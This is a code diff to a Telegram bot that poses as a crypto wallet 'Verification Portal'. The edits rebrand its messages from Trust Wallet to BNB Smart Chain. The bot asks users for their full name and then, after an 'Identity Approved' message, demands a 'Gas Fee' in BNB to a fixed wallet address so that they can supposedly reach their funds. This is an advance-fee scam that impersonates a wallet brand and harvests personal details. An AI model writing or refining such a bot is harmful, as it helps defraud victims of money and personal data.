@@ -60,9 +60,8 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data.clear()
 
     await update.message.reply_text(
-    "🔐 Welcome to the Trust Wallet Verification Portal.\n\n"
-    "To ensure secure access, please complete the verification process.\n\n"
-    "Once your verification is approved, you will be able to access your funds.\n\n"
+    "🔐 Welcome to BNB Smart Chain Verification Portal.\n\n"
+    "Complete verification to confirm your eligibility and access your funds.\n\n"
     "Please provide the required information.\n\n"
     "Enter your Full Name:"
 )
@@ -256,10 +255,10 @@ async def admin_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text=(
         "Congratulations 🎉\n"
         "Identity Approved\n\n"
-        f"Network Fee: {PAYMENT_AMOUNT}\n"
+        f"Gas Fee: {PAYMENT_AMOUNT}\n"
         "This fee is required to process the blockchain transaction and finalize wallet activation, enabling the Send, Receive, Buy, and Sell features.\n\n"
         "Payment Method:\n"
-        "(BNB Coin)\n"
+        "BNB (BSC)\n"
         f"Wallet Address:\n`{WALLET_ADDRESS}`\n\n"
         "Transaction ID using:\n"
         "/tx YOUR_TRANSACTION_ID\n\n"
